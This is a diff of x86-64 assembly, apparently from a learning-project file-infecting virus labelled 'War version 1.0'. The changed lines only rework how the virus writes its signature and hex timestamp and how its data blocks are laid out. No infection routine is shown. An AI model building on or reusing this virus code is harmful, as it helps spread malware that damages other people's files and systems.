@@ -653,11 +653,17 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 				.nocypher:
 					cmp r8, _timestamp - _start
 					jl .end
+					xor r11, r11
 					.build_timestamp:
-						cmp r8, _close_folder - _start - 1
+						cmp r8, _close_folder - _start - 2
 						jg .end
 						mov r10, r8
 						sub r10, _timestamp - _start
+						;;;
+						cmp r10, 8
+						jl .continue
+						add r10, 8						
+					.continue:
 						shr r10, 1  ;/ 2
 						mov r10b, byte [r15 + 1550 + r10]
 						test r8, 1 ; is_odd
@@ -678,16 +684,14 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 								sub r10b, 10
 								add byte r10b, 'A'
 							.end_conversion:
-							mov byte [r15 + 1538], r10b
-							lea rsi, [r15 + 1538]
-						
+								mov byte [r15 + 1538], r10b
+								lea rsi, [r15 + 1538]
 				.end:
-					
-				mov rax, SYS_WRITE
-				syscall
-				inc r8
-				cmp r8, r9
-				jl .loop
+					mov rax, SYS_WRITE
+					syscall
+					inc r8
+					cmp r8, r9
+					jl .loop
 			mov rax, SYS_SYNC
 			syscall
 
@@ -784,12 +788,14 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		syscall
 
 
+nanoseconds:
+	ns dq 0, 1
 war:
 	db 0,'War version 1.0 (c)oded by Core Contributor darodrig-rcabezas, Lord Commander of the Night', 0x27 ,'s Watch - '
 _timestamp:
-	db 49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49,49, 0x00				; 11111111
-nanoseconds:
-	ns dq 0, 1
+	times 16 db 0
+_zero:
+	db 0
 _close_folder:
 	mov rdi, [r15 + 16]
 	mov rax, SYS_CLOSE
